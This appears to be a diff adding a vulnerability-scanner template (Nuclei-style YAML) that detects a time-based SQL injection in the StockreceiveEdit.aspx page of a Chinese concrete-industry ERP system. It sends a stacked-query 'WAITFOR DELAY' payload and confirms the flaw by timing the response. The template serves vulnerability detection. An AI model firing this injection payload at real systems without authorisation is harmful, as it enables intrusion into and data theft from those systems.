@@ -1,0 +1,42 @@
+id: poc-yaml-rmcx-erp-stockreceiveedit-sqli
+info:
+  name: 商混ERP系统 StockreceiveEdit接口存在sql注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(5,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3) + 2}}"
+http:
+  - raw:
+      - |
+        GET /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "甲供材料管理"
+          - "合同号"
+        part: body
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
+  - raw:
+      - |
+        GET /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:{{t3}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "甲供材料管理"
+          - "合同号"
+        part: body
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration >= to_number(t3) && duration <= to_number(t4)"
